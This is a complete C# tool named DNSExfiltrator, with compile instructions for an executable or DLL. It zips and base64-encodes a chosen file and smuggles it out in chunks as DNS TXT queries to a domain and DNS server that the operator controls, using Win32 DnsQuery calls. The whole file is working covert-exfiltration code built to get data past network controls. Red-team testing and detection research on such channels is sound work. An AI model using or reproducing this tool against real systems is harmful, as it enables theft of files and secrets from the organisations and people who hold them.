/*
Author: Arno0x0x, Twitter: @Arno0x0x

How to compile:
===============
As a standalone executable:
	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /reference:System.IO.Compression.dll /out:dnsExfiltrator.exe dnsExfiltrator.cs
	
As a DLL:
	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /target:library /reference:System.IO.Compression.dll /out:dnsExfiltrator.dll dnsExfiltrator.cs
*/
using System;
using System.Net;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Linq;
using System.Collections;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Threading;
	
namespace DNSExfiltrator
{
	//============================================================================================
	// This class performs the actual data exfiltration using DNS requests covert channel
	//============================================================================================
	public class DNSExfiltrator
	{	
		//------------------------------------------------------------------------------------
		// Split a string in a number of fixed size chunks
		//------------------------------------------------------------------------------------
		private static System.Collections.Generic.IEnumerable<string> SplitInChunks(string str, int maxChunkSize)
		{
			for (int i = 0; i < str.Length; i += maxChunkSize) 
				yield return str.Substring(i, Math.Min(maxChunkSize, str.Length-i));
		}
		
		//------------------------------------------------------------------------------------
		// Print usage
		//------------------------------------------------------------------------------------
		private static void PrintUsage()
		{
			Console.WriteLine("Usage:");
			Console.WriteLine("{0} <file> <domainName> [s=DNS_server] [t=throttleTime]", System.AppDomain.CurrentDomain.FriendlyName);
			Console.WriteLine("\tfile:\t\t[MANDATORY] The file name to the file to be exfiltrated.");
			Console.WriteLine("\tdomainName:\t[MANDATORY] The domain name to use for DNS requests.");
			Console.WriteLine("\tDNS_Server:\t[OPTIONNAL] The DNS server name or IP to use for DNS requests. Defaults to the system one.");
			Console.WriteLine("\tthrottleTime:\t[OPTIONNAL] The time in milliseconds to wait between each DNS request.");
		}
		
		//------------------------------------------------------------------------------------
		// Outputs to console with color
		//------------------------------------------------------------------------------------
		private static void PrintColor(string text)
		{
			if (text.StartsWith("[!]")) { Console.ForegroundColor = ConsoleColor.Red;}
			else if (text.StartsWith("[+]")) { Console.ForegroundColor = ConsoleColor.Green;}
			else if (text.StartsWith("[*]")) { Console.ForegroundColor = ConsoleColor.Blue;}
			
			Console.WriteLine(text);
			
			// Reset font color
			Console.ForegroundColor = ConsoleColor.White;
		}
		
		//------------------------------------------------------------------------------------
		// Outputs to console with color
		//------------------------------------------------------------------------------------
		private static string Encode(byte[] data)
		{
			string result = String.Empty;
			
			// characters used in DNS names through the Win32 API resolution library do not
			// support all of the base64 characters:
			// '/' and '+' characters are substituded
			// '=' padding character are removed and will need to be recomputed at the remote end
			result = Convert.ToBase64String(data).Replace("=","").Replace("/","_").Replace("+","-");
			return result;
		}
		
		//------------------------------------------------------------------------------------
		// MAIN FUNCTION
		//------------------------------------------------------------------------------------
        public static void Main(string[] args)
        {
			//--------------------------------------------------------------
			// Perform arguments checking
			if(args.Length < 2) {
				PrintColor("[!] Missing arguments");
				PrintUsage();
				return;
			}
			
			string filePath = args[0];
			string domainName = args[1];
			string fileName = Path.GetFileName(filePath);
			string dnsServer = null;
			int throttleTime = 0;
			
			if (!File.Exists(filePath)) {
				PrintColor(String.Format("[!] File not found: {0}",filePath));
				return;
			}
			
			// Do we have additionnal arguments ?
			if (new[] {3, 4}.Contains(args.Length)) {
				int i = 2;
				while (i < args.Length) {
					if (args[i].StartsWith("s=")) {
						dnsServer = args[i].Split('=')[1];
						PrintColor(String.Format("[*] Working with DNS server [{0}]", dnsServer));
					}
					else if (args[i].StartsWith("t=")) {
						throttleTime = Convert.ToInt32(args[i].Split('=')[1]);
						PrintColor(String.Format("[*] Setting throttle time to [{0}ms]", throttleTime));
					}
					i++;
				}
			}
			
			string data = String.Empty;
			
			//--------------------------------------------------------------
			// Compress the file in memory
			PrintColor(String.Format("[*] Compressing (zip) the [{0}] file in memory",filePath));
			using (var zipStream = new MemoryStream())
			{
				using (var archive = new ZipArchive(zipStream, ZipArchiveMode.Create, true))
				{
					var entryFile = archive.CreateEntry(fileName);
					using (var entryStream = entryFile.Open())
					using (var streamWriter = new BinaryWriter(entryStream))
					{
						streamWriter.Write(File.ReadAllBytes(filePath));
					}
				}

				zipStream.Seek(0, SeekOrigin.Begin);
				PrintColor("[*] Converting the zipped file to a base64 representation");
				data = Encode(zipStream.ToArray());
				PrintColor(String.Format("[*] Total size of data to be transmitted: [{0}] bytes", data.Length));
			}
			
			//--------------------------------------------------------------
			// Compute the size of the chunk and how it can be split into subdomains (labels)
			// Rationnal: DNS request max size is 255 bytes, each label max size is 63 chars => 64 bytes due to the byte required to code the label length
			// https://blogs.msdn.microsoft.com/oldnewthing/20120412-00/?p=7873
			int bytesLeft = 255 - (domainName.Length+2); // domain name space usage in bytes
			int nbFullLabels = bytesLeft/64;
			int smallestLabelSize = bytesLeft%64 - 1;
			int chunkMaxSize = nbFullLabels*63 + smallestLabelSize;
			int nbChunks = data.Length/chunkMaxSize + 1;
			PrintColor(String.Format("[+] Chunk max size: [{0}] bytes", chunkMaxSize));
			PrintColor(String.Format("[+] Number of chunks: [{0}]", nbChunks));
			
			//--------------------------------------------------------------
			// Send the initial request advertising the fileName and the total number of chunks
			string request = String.Empty;
			
			request = "init." + Encode(Encoding.UTF8.GetBytes(String.Format("{0}|{1}",fileName, nbChunks))) + "." + domainName;
			PrintColor("[*] Sending init request");
			try {
				string[] reply = DnsResolver.GetTXTRecords(request,dnsServer);
				if (reply[0] != "OK") {
					PrintColor(String.Format("[!] Unexpected answer for an initialization request: [{0}]", reply[0]));
					return;
				}
			}
			catch (Win32Exception e) {
				PrintColor(String.Format("[!] Unexpected exception occured: [{0}]",e.Message));
				return;
			}
			
			//--------------------------------------------------------------
			// Send all chunks of data, one by one
			string chunk = String.Empty;
			int count = 1;
			int countACK;
			
			for (int i = 0; i < data.Length; i += chunkMaxSize) {
				request = String.Empty;
				
				// Get a first chunk of data to send
				chunk = data.Substring(i, Math.Min(chunkMaxSize, data.Length-i));
				int chunkLength = chunk.Length;

				int j = 0;
				while (j*63 < chunkLength) {
					request += chunk.Substring(j*63, Math.Min(63, chunkLength-(j*63))) + ".";
					j++;
				}

				request += domainName;
				
				// Now send the request
				try {
					string[] reply = DnsResolver.GetTXTRecords(request,dnsServer);
					countACK = Convert.ToInt32(reply[0]);
					
					if (countACK != count) {
						PrintColor(String.Format("[!] Chunk number [{0}] lost !!", countACK));
					}
				}
				catch (Win32Exception e) {
					PrintColor(String.Format("[!] Unexpected exception occured: [{0}]",e.Message));
					return;
				}
				count++;
				
				// Apply throttle if requested
				if (throttleTime != 0) {
					Thread.Sleep(throttleTime);
				}
			}
			
			PrintColor("[*] DONE !");
		} // End Main
		
	}
		
	//============================================================================================
	// This class provides DNS resolution by using the PInvoke calls to the native Win32 API
	//============================================================================================
    public class DnsResolver
    {       
		//---------------------------------------------------------------------------------
		// Import WIN32 API extern function
		//---------------------------------------------------------------------------------
        [DllImport("dnsapi", EntryPoint="DnsQuery_W", CharSet=CharSet.Unicode, SetLastError=true, ExactSpelling=true)]
        private static extern int DnsQuery([MarshalAs(UnmanagedType.VBByRefStr)]ref string pszName, DnsRecordTypes wType, DnsQueryOptions options, ref IP4_ARRAY dnsServerIpArray, ref IntPtr ppQueryResults, int pReserved);

        [DllImport("dnsapi", CharSet=CharSet.Auto, SetLastError=true)]
        private static extern void DnsRecordListFree(IntPtr pRecordList, int FreeType);
		
		//---------------------------------------------------------------------------------
		// Resolving TXT records only for now
		//---------------------------------------------------------------------------------
        public static string[] GetTXTRecords(string domain, string serverIP = null)
        {
			IntPtr recordsArray = IntPtr.Zero;
			IntPtr dnsRecord = IntPtr.Zero;
            TXTRecord txtRecord;
			IP4_ARRAY dnsServerArray = new IP4_ARRAY();
			
			if (serverIP != null) {
				uint address = BitConverter.ToUInt32(IPAddress.Parse(serverIP).GetAddressBytes(), 0);
				uint[] ipArray = new uint[1];
				ipArray.SetValue(address, 0);
				dnsServerArray.AddrCount = 1;
				dnsServerArray.AddrArray = new uint[1];
				dnsServerArray.AddrArray[0] = address;
			}
			
           
			// Interop calls will only work on Windows platform (no mono c#)
			if (Environment.OSVersion.Platform != PlatformID.Win32NT)
            {
                throw new NotSupportedException();
            }
			
			ArrayList recordList = new ArrayList();
			try
			{
				int queryResult = DnsResolver.DnsQuery(ref domain, DnsRecordTypes.DNS_TYPE_TXT, DnsQueryOptions.DNS_QUERY_BYPASS_CACHE, ref dnsServerArray, ref recordsArray, 0);
				
				// Check for error
				if (queryResult != 0)
				{
					throw new Win32Exception(queryResult);
				}
				
				// Loop through the result record list
				for (dnsRecord = recordsArray; !dnsRecord.Equals(IntPtr.Zero); dnsRecord = txtRecord.pNext)
				{
					txtRecord = (TXTRecord) Marshal.PtrToStructure(dnsRecord, typeof(TXTRecord));
					if (txtRecord.wType == (int)DnsRecordTypes.DNS_TYPE_TXT)
					{
						//Console.WriteLine("Size of array: {0}",txtRecord.dwStringCount);
						string txt = Marshal.PtrToStringAuto(txtRecord.pStringArray);
						recordList.Add(txt);
					}
				}
			}
			finally
			{
				DnsResolver.DnsRecordListFree(recordsArray, 0);
			}
				return (string[]) recordList.ToArray(typeof(string));
		}

		//---------------------------------------------------------------------------------
		// WIN32 DNS STRUCTURES
		//---------------------------------------------------------------------------------
		/// <summary>
		/// See https://msdn.microsoft.com/en-us/library/windows/desktop/ms682139(v=vs.85).aspx
		/// </summary>
		public struct IP4_ARRAY
		{
			/// DWORD->unsigned int
			public UInt32 AddrCount;
			/// IP4_ADDRESS[1]
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1, ArraySubType = UnmanagedType.U4)] public UInt32[] AddrArray;
		}
		
		[StructLayout(LayoutKind.Sequential)]
        private struct TXTRecord
        {
			// Generic DNS record structure
            public IntPtr pNext;
            public string pName;
            public short wType;
            public short wDataLength;
            public int flags;
            public int dwTtl;
            public int dwReserved;
            
			// TXT record specific
			public int dwStringCount;
            public IntPtr pStringArray;
            
        }
		
		/// <summary>
		/// See http://msdn.microsoft.com/en-us/library/windows/desktop/cc982162(v=vs.85).aspx
		/// </summary>
		[Flags]
		private enum DnsQueryOptions
		{
			DNS_QUERY_STANDARD = 0x0,
			DNS_QUERY_ACCEPT_TRUNCATED_RESPONSE = 0x1,
			DNS_QUERY_USE_TCP_ONLY = 0x2,
			DNS_QUERY_NO_RECURSION = 0x4,
			DNS_QUERY_BYPASS_CACHE = 0x8,
			DNS_QUERY_NO_WIRE_QUERY = 0x10,
			DNS_QUERY_NO_LOCAL_NAME = 0x20,
			DNS_QUERY_NO_HOSTS_FILE = 0x40,
			DNS_QUERY_NO_NETBT = 0x80,
			DNS_QUERY_WIRE_ONLY = 0x100,
			DNS_QUERY_RETURN_MESSAGE = 0x200,
			DNS_QUERY_MULTICAST_ONLY = 0x400,
			DNS_QUERY_NO_MULTICAST = 0x800,
			DNS_QUERY_TREAT_AS_FQDN = 0x1000,
			DNS_QUERY_ADDRCONFIG = 0x2000,
			DNS_QUERY_DUAL_ADDR = 0x4000,
			DNS_QUERY_MULTICAST_WAIT = 0x20000,
			DNS_QUERY_MULTICAST_VERIFY = 0x40000,
			DNS_QUERY_DONT_RESET_TTL_VALUES = 0x100000,
			DNS_QUERY_DISABLE_IDN_ENCODING = 0x200000,
			DNS_QUERY_APPEND_MULTILABEL = 0x800000,
			DNS_QUERY_RESERVED = unchecked((int)0xF0000000)
		}

		/// <summary>
		/// See http://msdn.microsoft.com/en-us/library/windows/desktop/cc982162(v=vs.85).aspx
		/// Also see http://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml
		/// </summary>
		private enum DnsRecordTypes
		{
			DNS_TYPE_A = 0x1,
			DNS_TYPE_NS = 0x2,
			DNS_TYPE_MD = 0x3,
			DNS_TYPE_MF = 0x4,
			DNS_TYPE_CNAME = 0x5,
			DNS_TYPE_SOA = 0x6,
			DNS_TYPE_MB = 0x7,
			DNS_TYPE_MG = 0x8,
			DNS_TYPE_MR = 0x9,
			DNS_TYPE_NULL = 0xA,
			DNS_TYPE_WKS = 0xB,
			DNS_TYPE_PTR = 0xC,
			DNS_TYPE_HINFO = 0xD,
			DNS_TYPE_MINFO = 0xE,
			DNS_TYPE_MX = 0xF,
			DNS_TYPE_TEXT = 0x10,       // This is how it's specified on MSDN
			DNS_TYPE_TXT = DNS_TYPE_TEXT,
			DNS_TYPE_RP = 0x11,
			DNS_TYPE_AFSDB = 0x12,
			DNS_TYPE_X25 = 0x13,
			DNS_TYPE_ISDN = 0x14,
			DNS_TYPE_RT = 0x15,
			DNS_TYPE_NSAP = 0x16,
			DNS_TYPE_NSAPPTR = 0x17,
			DNS_TYPE_SIG = 0x18,
			DNS_TYPE_KEY = 0x19,
			DNS_TYPE_PX = 0x1A,
			DNS_TYPE_GPOS = 0x1B,
			DNS_TYPE_AAAA = 0x1C,
			DNS_TYPE_LOC = 0x1D,
			DNS_TYPE_NXT = 0x1E,
			DNS_TYPE_EID = 0x1F,
			DNS_TYPE_NIMLOC = 0x20,
			DNS_TYPE_SRV = 0x21,
			DNS_TYPE_ATMA = 0x22,
			DNS_TYPE_NAPTR = 0x23,
			DNS_TYPE_KX = 0x24,
			DNS_TYPE_CERT = 0x25,
			DNS_TYPE_A6 = 0x26,
			DNS_TYPE_DNAME = 0x27,
			DNS_TYPE_SINK = 0x28,
			DNS_TYPE_OPT = 0x29,
			DNS_TYPE_DS = 0x2B,
			DNS_TYPE_RRSIG = 0x2E,
			DNS_TYPE_NSEC = 0x2F,
			DNS_TYPE_DNSKEY = 0x30,
			DNS_TYPE_DHCID = 0x31,
			DNS_TYPE_UINFO = 0x64,
			DNS_TYPE_UID = 0x65,
			DNS_TYPE_GID = 0x66,
			DNS_TYPE_UNSPEC = 0x67,
			DNS_TYPE_ADDRS = 0xF8,
			DNS_TYPE_TKEY = 0xF9,
			DNS_TYPE_TSIG = 0xFA,
			DNS_TYPE_IXFR = 0xFB,
			DNS_TYPE_AFXR = 0xFC,
			DNS_TYPE_MAILB = 0xFD,
			DNS_TYPE_MAILA = 0xFE,
			DNS_TYPE_ALL = 0xFF,
			DNS_TYPE_ANY = 0xFF,
			DNS_TYPE_WINS = 0xFF01,
			DNS_TYPE_WINSR = 0xFF02,
			DNS_TYPE_NBSTAT = DNS_TYPE_WINSR
		}
    }
}